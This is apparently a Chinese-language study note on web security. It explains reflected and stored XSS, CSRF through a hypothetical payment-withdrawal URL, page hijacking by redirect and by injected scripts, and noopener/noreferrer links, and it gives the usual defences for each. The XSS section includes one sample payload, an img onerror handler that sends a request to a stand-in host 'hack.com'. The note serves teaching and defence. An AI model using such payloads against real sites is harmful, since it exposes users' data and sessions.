### - XSS
> `cross site scripting` 跨站脚本攻击 
>  攻击者往 web 页面插入恶意 Script 代码，  
>  当其他用户浏览该网页时，嵌入的脚本代码就会被执行，从而到达恶意攻击用户的目的

1. 反射型 

> https://www.xxx.com/search?item=<img onerror="new Image().src='//hack.com?c=' src='null'>"
> 很多站点都提供搜索服务，如果把搜索的关键词修改为可执行的javascript语句  
> 服务器不加处理将类似的代码现实到页面  
> XSS代码将会被执行

2. 存储型

> 利用站点本身合法的存储结构，通过站点提供的接口提交XSS代码  
> 会被存储到服务器上 当其他用户访问该网页时，服务器把包含XSS的内容反馈给用户  
> 从而攻击用户

##### 服务器都会将javascript当作文本处理， 在服务端整合进HTML文档中
##### 在浏览器解析这些文本的过程 也就是XSS被执行的时候
##### 所有最主要的防范措施就是 对任何用户提交到服务器上的文本都要经过编码或者转译



### - CSRF
> `cross-site request forgery` 跨站请求伪造  
> 通过伪装来自守信用户的请求来利用  
> 攻击者盗用了你的身份，以你的名义发送恶意请求  

> 我们先假设支付宝存在CSRF漏洞，我的支付宝账号是lyq，攻击者的支付宝账号是xxx。  
> 然后我们通过网页请求的方式 http://zhifubao.com/withdraw?account=lyq&amount=10000&for=lyq2  
> 可以把我账号lyq的10000元转到我的另外一个账号lyq2上去。通常情况下，该请求发送到支付宝服务器后,  
> 服务器会先验证该请求是否来自一个合法的session并且该session的用户已经成功登陆。攻击者在支付吧也有账号xxx， 
> 他知道上文中的URL可以进行转账操作，于是他自己可以发送一个请求 http://zhifubao.com/withdraw?account=lyq&amount=10000&for=xxx 到支付宝后台。  
> 但是这个请求是来自攻击者而不是来自我lyq，所以不能通过安全认证，因此该请求作废。  
> 这时，攻击者xxx想到了用CSRF的方式，他自己做了个黄色网站，在网站中放了如下代码：http://zhifubao.com/withdraw?account=lyq&amount=10000&for=xxx并且通过黄色链接诱使我来访问他的网站。  
> 当我禁不住诱惑时就会点了进去，上述请求就会从我自己的浏览器发送到支付宝，  
> 而且这个请求会附带我的浏览器中的cookie。  
> 大多数情况下，该请求会失败，因为支付宝要求我的认证信息，但是我如果刚访问支付宝不久，还没有关闭支付宝页面，  
> 我的浏览器中的cookie存有我的认证信息，这个请求就会得到响应，从我的账户中转10000元到xxx账户里，而我丝毫不知情，攻击者拿到钱后逍遥法外。所以以后一定要克制住自己，不要随便打开别人的链接。

#### CSRF 防御措施主要有验证 HTTP Referer 字段，和 添加 token 验证、验证码 



### - 页面劫持
1. 跳转型  

> 用户输入地址A，但是跳转到地址B，用户输入baidu.com跳转到so.com或者sm.cn，并且对方网站有故意做成和百度搜索差不多的样子。  

##### 这种劫持，输入 url 到 页面加载结束，判断 url 是否一致

2.注入型

> 在页面传输过程中，对内容进行再加工（注入 js、iframe、篡改页面）。注入js的方式可以通过document.write或者直接改html代码片段等方式，给页面增加外链js，为了做到更难检测，有些运营商会捏造一个不存在的url地址，从而不被过滤或者检测。  

```
案例1：运营商会用自己识别的ip或者域名做js网址，wap.zjtoolbar.10086.cn这类只有在浙江移动网络下才会被解析出来，同理ip也是

案例2：运营商很聪明，知道页面可以检测所有外链js的域名，比如：m.baidu.com我只允许m.baidu.com/static的外链js，其他js都会  
被记录反馈为了不被检测出来，我遇见个case电信会访问一个不存在的地址，比如：m.baidu.com/static/abc.js，这个地址在运营商直  
接返回劫持的js代码,请求不会发到百度的服务器。
```  

##### 改写 `document.write` 方法 和  `window.top = parent!== window` 和  `https://`
    


### - a 标签 target = '\_blank'
添加 noopener noreferrer 是为了防止恶意网站通过 window.opener 访问到打开的新窗口的 window 对象，从而进行恶意操作。具体来说，noopener 属性表示打开的新窗口不应该与原始页面共享 window.opener 属性，而 noreferrer 属性表示不应该在 HTTP 请求头中发送 Referer 字段，以防止泄露原始页面的信息。这两个属性的组合可以提高安全性，防止一些恶意攻击。



